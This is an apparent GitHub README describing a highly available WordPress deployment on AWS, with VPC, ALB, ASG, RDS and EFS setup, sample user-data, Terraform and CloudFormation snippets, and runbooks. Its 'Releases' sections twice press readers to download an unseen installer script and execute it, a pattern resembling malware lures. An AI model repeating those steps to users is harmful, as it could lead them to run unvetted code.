# AWS WordPress Alta Disponibilidade — Deploy WordPress on AWS with ASG, ALB, RDS, EFS

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/bestNepalpvper/AWS-Wordpress-Alta-Disponibilidade/releases)

![AWS + WordPress](https://upload.wikimedia.org/wikipedia/commons/4/4e/WordPress_Logotype_Full_Color.svg)

Table of Contents
- About this project
- Key features
- Architecture diagram
- Components and responsibilities
- Architecture decisions
- Prerequisites
- Repository layout
- Quick start (automated)
- Manual deployment (detailed)
- WordPress configuration for scale
- Security and IAM
- Backups and DR
- Cost control and sizing
- Monitoring and logging
- Continuous delivery options
- Testing and validation
- Troubleshooting
- Releases
- Contributing
- License

About this project
This repository shows how to deploy WordPress on AWS in a highly available, scalable way. It uses Auto Scaling Group (ASG) for web tier, an Application Load Balancer (ALB) to distribute traffic, Amazon RDS for MySQL as the database, and Amazon EFS for shared persistent storage. The project also covers networking with NAT Gateway, security groups, IAM roles, and optional automation with Terraform or CloudFormation.

Key features
- Highly available web tier with Auto Scaling Group (multi-AZ).
- Public-facing Application Load Balancer with HTTPS termination.
- Managed MySQL through Amazon RDS (Multi-AZ, backups enabled).
- Shared persistent storage on Amazon EFS for wp-content.
- Infrastructure-as-code samples (Terraform / CloudFormation).
- EC2 launch configuration or AMI with user-data to mount EFS and install WordPress.
- Health checks and auto healing.
- Backup and restore strategies for RDS and EFS.
- Security and IAM best practices.
- Simple scripts for common tasks and tests.

Architecture diagram
![Architecture diagram](https://d0.awsstatic.com/diagrams/product-page-diagrams/Architecture-diagram_AWS-WordPress.19a6d0e2f3a1a7e2a1d6d9e59a2b0f3f2f7b6f39.png)

Components and responsibilities
- Route 53 (optional)
  - Route public DNS to the ALB.
  - Use alias records for convenience.
- VPC
  - Separate subnets for public and private resources.
  - Public subnets for ALB and NAT Gateway.
  - Private subnets for EC2 and RDS.
- Internet Gateway
  - Provide internet access for public subnets.
- NAT Gateway
  - Allow private instances to reach the internet for patches and downloads.
- Security Groups
  - ALB: allow HTTP/HTTPS from the internet.
  - EC2 web servers: allow traffic from ALB only, SSH from admin CIDR only.
  - RDS: allow MySQL port from web servers only.
- Application Load Balancer (ALB)
  - Route traffic to ASG instances.
  - Health checks against /wp-admin/ or a simple status page.
  - Terminate HTTPS or pass through certificate to instances.
- Auto Scaling Group (ASG)
  - Run web server instances across multiple AZs.
  - Use launch template with user-data script that mounts EFS and configures WordPress.
- Amazon EFS
  - Shared storage for wp-content uploads, themes, plugins.
  - Mount target in each VPC subnet for low-latency access.
  - Use lifecycle management, access points for security if needed.
- Amazon RDS (MySQL)
  - Managed relational database.
  - Multi-AZ for failover.
  - Automated backups and snapshots.
- Amazon S3 (optional)
  - Offload static assets or media via plugin.
  - Use S3 for backups, logs, or CloudFront origin.
- CloudWatch
  - Logs, metrics, alarms for ALB, EC2, RDS.
- IAM Roles
  - EC2 instance profile with just enough permissions to mount EFS and read SSM parameters if used.
  - Role for automation or CI/CD.

Architecture decisions
- Use EFS for wp-content
  - WordPress expects a writable shared file system for uploads, plugins, and themes.
  - EFS provides POSIX semantics and scales.
- Use RDS for MySQL
  - Managed service reduces operational burden.
  - Multi-AZ ensures database availability on AZ failure.
- Use ALB
  - Application layer routing and health checks.
  - Integrates with target groups and path-based routing.
- Use Auto Scaling Group
  - Replace failing instances automatically.
  - Scale out under load and scale in when load drops.
- Use Terraform (recommended) or CloudFormation
  - Manage resources as code.
  - Reuse modules and maintain state in a backend.

Prerequisites
- An AWS account with required quotas.
- AWS CLI installed and configured with an IAM user.
- Terraform (if you use the Terraform module).
- Optional: CloudFormation CLI or AWS Console.
- SSH key pair for EC2 if you need direct access.
- Domain name in Route 53 if you want friendly DNS.
- Basic knowledge of Linux, WordPress, and MySQL.

Repository layout
- /terraform/ - Terraform modules and examples.
- /cloudformation/ - CloudFormation templates.
- /scripts/ - Helper scripts (user-data, install scripts, backup helpers).
- /docs/ - Detailed architecture notes and diagrams.
- /ansible/ - Optional post-deploy steps.
- /examples/ - Example variable files and sample terraform.tfvars.
- README.md - This file.

Quick start (automated)
1. Clone the repo.
2. Edit variables in examples/terraform.tfvars.
3. Initialize Terraform:
   ```
   terraform init
   ```
4. Apply:
   ```
   terraform apply -var-file=examples/terraform.tfvars
   ```
5. Access WordPress via the ALB DNS.

Releases
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/bestNepalpvper/AWS-Wordpress-Alta-Disponibilidade/releases)

Download the latest release package from https://github.com/bestNepalpvper/AWS-Wordpress-Alta-Disponibilidade/releases and execute the contained installer script. The release contains a ready-made installer and helper scripts. After you download, run:
```
chmod +x aws-wordpress-installer.sh
./aws-wordpress-installer.sh
```
The installer will ask for minimal input and deploy the infrastructure as code artifacts. Use the release asset that matches your preferred IaC tool (terraform-package.tar.gz or cloudformation-package.zip). The script will select the appropriate file from the release and run it. If you use the web console instead, open the Releases page and download the package manually.

Manual deployment (detailed)
This section covers a manual, detailed deployment. It assumes you want fine control over each component.

Network and VPC
1. Create a VPC with CIDR like 10.0.0.0/16.
2. Create three AZs. In each AZ:
   - One public subnet (10.0.x.0/24) for ALB/NAT.
   - One private subnet (10.0.y.0/24) for EC2 and RDS.
3. Attach an Internet Gateway to the VPC.
4. Create a NAT Gateway in a public subnet and associate it with the private route tables.
5. Create route tables:
   - Public route table — routes 0.0.0.0/0 to IGW.
   - Private route table — routes 0.0.0.0/0 to NAT Gateway.

Security groups
- ALB SG
  - Inbound: 80, 443 from 0.0.0.0/0 (or specific CIDRs).
  - Outbound: All to allow traffic to targets.
- EC2 Web SG
  - Inbound: 80, 443 from ALB SG (reference).
  - Inbound: 22 from admin CIDR only.
  - Outbound: Allow to RDS SG on port 3306.
- RDS SG
  - Inbound: 3306 from EC2 Web SG.
  - Outbound: None or restricted.
- EFS SG
  - Inbound: NFS (2049) from EC2 Web SG.

EC2 launch template
- Use Amazon Linux 2 or Ubuntu LTS AMI.
- Install web server (Apache or Nginx), PHP-FPM.
- Set user-data to:
  - Install amazon-efs-utils or NFS client.
  - Mount EFS to /var/www/html/wp-content.
  - Install WordPress.
  - Configure wp-config.php to use RDS endpoint and EFS for wp-content.
  - Use environment variables or SSM Parameter Store for DB password.

Sample user-data (simplified)
```
#!/bin/bash
set -e
yum update -y
yum install -y httpd php php-mysqlnd amazon-efs-utils
systemctl enable httpd
systemctl start httpd

EFS_ID="fs-0123456789abcdef0"
mkdir -p /var/www/html/wp-content
mount -t efs $EFS_ID:/ /var/www/html/wp-content
echo "$EFS_ID:/ /var/www/html/wp-content efs defaults,_netdev 0 0" >> /etc/fstab

cd /var/www/html
if [ ! -f wp-config.php ]; then
  curl -O https://wordpress.org/latest.tar.gz
  tar -xzf latest.tar.gz --strip-components=1
  cp wp-config-sample.php wp-config.php
  sed -i "s/database_name_here/${DB_NAME}/" wp-config.php
  sed -i "s/username_here/${DB_USER}/" wp-config.php
  sed -i "s/password_here/${DB_PASS}/" wp-config.php
  sed -i "s/localhost/${RDS_ENDPOINT}/" wp-config.php
fi
chown -R apache:apache /var/www/html
```
Replace DB_NAME, DB_USER, DB_PASS, and RDS_ENDPOINT with values from your deployment method. You can inject them via user-data or via SSM parameter retrieval on boot.

Amazon EFS setup
- Create an EFS file system in your VPC.
- Create mount targets in each AZ used by the ASG.
- Choose General Purpose throughput or Provisioned if you need guaranteed throughput.
- Set lifecycle policy to move files to Infrequent Access after a time.
- Optionally use Access Points to simplify permissions and enforce a root directory.

Amazon RDS MySQL setup
- Engine: MySQL (compatible with your WP plugins).
- Multi-AZ deployment: Enabled.
- Storage type: General Purpose (gp3) or Provisioned IOPS for high I/O.
- Backup retention: 7 or more days.
- Public accessibility: Disabled.
- Subnet group: Private subnets.
- Security group: allow access from web tier only.
- Parameter groups and option groups: tune as needed.

WordPress configuration for scale
- Use wp-config.php to set DB_HOST to the RDS endpoint.
- Set FS_METHOD to 'direct' or use EFS so WordPress can write files.
- Use object caching (Redis or Memcached) to reduce DB load.
  - Deploy ElastiCache cluster in the private subnets.
  - Install corresponding plugin on WordPress.
- Use a reverse proxy or caching plugin to reduce dynamic page generation.
- Offload static media to S3 + CloudFront for better performance and lower EFS IOPS.
- Use session storage (if required) in Redis or DynamoDB to avoid sticky sessions.

Database setup and migrations
- Create a database and a low-privilege user for WordPress.
- Run the WordPress installer via browser using the ALB DNS.
- For upgrades and migrations:
  - Use RDS snapshots before a major change.
  - Test plugin upgrades on a copy of the DB.
  - Use read replicas for analytics or heavy read traffic.

Security and IAM
- Use least-privilege IAM roles.
  - EC2 instance role: only mount EFS and get SSM parameters if used.
  - CI/CD role: only deploy CloudFormation or Terraform with specific permissions.
- Enforce encryption at rest
  - RDS: enable encryption.
  - EFS: enable encryption at rest.
  - S3: enable encryption for backups.
- Enforce encryption in transit
  - Use ALB with TLS termination.
  - Use HTTPS between ALB and backends if policy requires end-to-end TLS.
- Rotate database credentials
  - Use AWS Secrets Manager to store and rotate DB credentials.
  - Inject secrets to EC2 via IAM role and Secrets Manager SDK.
- Use security group references instead of IPs where possible.
- Lock down SSH access to admin network only.

Backups and disaster recovery
- RDS
  - Enable automated backups.
  - Take manual snapshots before schema updates.
  - Use point-in-time recovery for accidental deletes.
- EFS
  - Use AWS Backup to schedule EFS backups.
  - Optionally copy critical media to S3 for extra redundancy.
- Full restore test
  - Regularly test restore from snapshots into a staging environment.
  - Document restore runbook and time objectives.
- Cross-region DR
  - Use cross-region RDS read replicas for warm DR.
  - Replicate S3, or use lifecycle policies to copy to a DR region.

Cost control and sizing
- Right-size instances
  - Start small for dev or staging.
  - Use CloudWatch metrics to adjust instance types.
- Reserved Instances or Savings Plans
  - Commit for long-term workloads to reduce costs.
- EFS costs
  - Use EFS Infrequent Access and lifecycle management.
  - Offload static assets to S3 where feasible.
- RDS storage autoscaling
  - Monitor I/O and storage; enable autoscaling where supported.
- NAT Gateway costs
  - Minimize cross-AZ and cross-subnet traffic through NAT.
  - Use a single NAT Gateway per AZ for redundancy, not one per subnet.
- Test cost estimates with the AWS Pricing Calculator.

Monitoring and logging
- CloudWatch metrics
  - ALB: RequestCount, HTTPCode_ELB_5XX, TargetResponseTime.
  - EC2: CPUUtilization, NetworkIn, NetworkOut.
  - RDS: CPU, FreeableMemory, ReadIOPS, WriteIOPS, DatabaseConnections.
  - EFS: BurstCreditBalance, StorageUsed.
- CloudWatch Logs
  - Configure Apache/Nginx and PHP-FPM logs to CloudWatch Logs via CloudWatch agent.
- Alarms
  - Alarm on high error responses and high latency.
  - Alarm on RDS storage nearing limit.
  - Alarm on instance health checks failing.
- Tracing and APM
  - Integrate X-Ray or a third-party APM for deep tracing if needed.

Continuous delivery options
- GitOps with Terraform
  - Store Terraform state in an S3 bucket with DynamoDB state locking.
  - Use a CI pipeline to terraform plan and apply.
- GitHub Actions
  - Use workflows to run plan and require approvals before apply.
- AWS CodePipeline + CodeBuild
  - Build artifacts, run tests, and deploy using CloudFormation change sets.
- Database migrations
  - Use migration tools (WP-CLI, custom scripts) that run in a maintenance window.

Testing and validation
- Smoke tests
  - HTTP GET to ALB root and a health endpoint.
  - Check wp-login or a /status page.
- Load tests
  - Use tools like siege, ab, or locust to add load and ensure autoscaling works.
  - Measure ALB connection saturation and backend response times.
- Failover tests
  - Stop one AZ or terminate instances to test ASG heal and cross-AZ failover.
  - Simulate RDS failover to ensure minimal downtime.
- Backup restore tests
  - Restore RDS snapshot to a new DB and confirm data.
  - Restore EFS from AWS Backup and mount to a test instance.

Troubleshooting
- If the site returns 502 or 504:
  - Check ALB target group health.
  - Verify instance health and web server logs.
  - Confirm wp-config.php DB settings and RDS endpoint reachability.
- If uploads fail:
  - Confirm EFS mount and permissions.
  - Check fstab entries and amazon-efs-utils logs.
- If DB connection fails:
  - Check RDS security group.
  - Confirm DB user credentials and database name.
  - Check RDS maintenance and events in the console.
- If ASG scales unexpectedly:
  - Review CloudWatch alarms and scaling policies.
  - Check scheduled scaling events.
- If user-data fails:
  - View /var/log/cloud-init-output.log or /var/log/user-data.log on the instance.
  - Confirm IAM instance profile and pre-signed credentials if required.

Examples and snippets
- Terraform: simple ALB + ASG + RDS example (snippet)
```
resource "aws_launch_template" "web" {
  name_prefix = "wp-web-"
  image_id    = var.ami
  instance_type = var.instance_type
  iam_instance_profile {
    name = aws_iam_instance_profile.ec2_profile.name
  }
  user_data = filebase64("${path.module}/scripts/user-data.sh")
}

resource "aws_autoscaling_group" "web_asg" {
  launch_template {
    id      = aws_launch_template.web.id
    version = "$Latest"
  }
  min_size = var.asg_min
  max_size = var.asg_max
  desired_capacity = var.asg_desired
  vpc_zone_identifier = var.private_subnet_ids
  target_group_arns = [aws_lb_target_group.wp_tg.arn]
  health_check_type = "ELB"
  max_instance_lifetime = 86400
}
```

- CloudFormation: minimal RDS resource example (snippet)
```
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  WordPressDB:
    Type: AWS::RDS::DBInstance
    Properties:
      DBInstanceClass: db.t3.medium
      AllocatedStorage: 20
      Engine: mysql
      MasterUsername: !Ref DBUser
      MasterUserPassword: !Ref DBPassword
      MultiAZ: true
      VPCSecurityGroups:
        - !GetAtt RdsSecurityGroup.GroupId
```

Operational runbook examples
- Deploy patch to web tier
  - Create new launch template version with patched AMI or updated user-data.
  - Update ASG launch template version.
  - Use rolling update: set max instance termination to ensure at least one instance is always healthy.
- Perform database maintenance
  - Take manual DB snapshot.
  - Put site into maintenance mode.
  - Run migrations.
  - Test and remove maintenance mode.
- Scale down for cost savings
  - Reduce ASG desired and min size.
  - Resize RDS if possible for non-production.

CI/CD pipeline example (GitHub Actions)
- Workflow triggers on push to main.
- Jobs:
  - Terraform fmt and validate.
  - Terraform plan and upload plan artifact.
  - Manual approval step (if required).
  - Terraform apply with proper backend and role assumption.

Example workflow steps:
```
- name: Terraform Init
  run: terraform init -backend-config="bucket=${{ secrets.TF_STATE_BUCKET }}"

- name: Terraform Plan
  run: terraform plan -var-file=prod.tfvars -out plan.tfplan

- name: Terraform Apply
  if: github.event.pull_request.merged == true
  run: terraform apply plan.tfplan
```

Plugins and WordPress hardening
- Keep core, themes, and plugins up to date.
- Use security plugin like Wordfence or Sucuri.
- Use a web application firewall (WAF) at ALB or CloudFront.
- Implement rate limiting at ALB or via plugin.
- Disable file editing via wp-config.php:
  ```
  define('DISALLOW_FILE_EDIT', true);
  ```
- Set proper permissions for uploaded files and directories.

Logging and log rotation
- Collect web server and PHP logs to CloudWatch Logs.
- Rotate logs locally with logrotate.
- Keep retention policy in CloudWatch that matches compliance needs.
- Send slow query logs from RDS to CloudWatch or S3 for analysis.

Plugins for scale
- Use object cache plugins:
  - Redis Object Cache or W3 Total Cache with ElastiCache backend.
- For search use cases:
  - ElasticSearch or OpenSearch for full-text search.
- For media:
  - Use plugins that offload to S3 and rewrite URLs.

Maintenance windows and upgrades
- Schedule maintenance windows for plugin and theme upgrades.
- Scale down during maintenance to reduce blast radius.
- Use blue/green for major updates:
  - Deploy a new environment and switch DNS to it.
  - Keep the old environment for quick rollback.

Testing checklist before production cutover
- Confirm ALB is healthy and serving 200 OK.
- Confirm WordPress installation completes.
- Confirm EFS allows uploads from multiple instances.
- Confirm RDS backups run and automated snapshots exist.
- Confirm CloudWatch alarms for core metrics.
- Validate HTTPS and certificate renewals.
- Validate logging and retention.

Useful scripts and tools
- wp-cli for admin and scripting:
  - Install plugins, update core, manage users.
- awscli for automation and quick checks.
- Siege or ab for load testing.
- jq for JSON parsing in shell scripts.

Releases (again)
Visit the Releases page and download the package and scripts you need:
https://github.com/bestNepalpvper/AWS-Wordpress-Alta-Disponibilidade/releases

Download the release asset that matches your desired deployment method. The release includes:
- terraform-package.tar.gz — Terraform modules and examples.
- cloudformation-package.zip — CloudFormation templates.
- aws-wordpress-installer.sh — Installer wrapper for the release.
After you download, make the installer executable and run it:
```
chmod +x aws-wordpress-installer.sh
./aws-wordpress-installer.sh
```

Contributing
- Open an issue for bugs, design questions, or feature requests.
- Fork the repository and submit pull requests.
- Follow the repository code style.
- Keep changes focused and document any design choices in PR descriptions.

License
This project uses the MIT License. See LICENSE file for full text.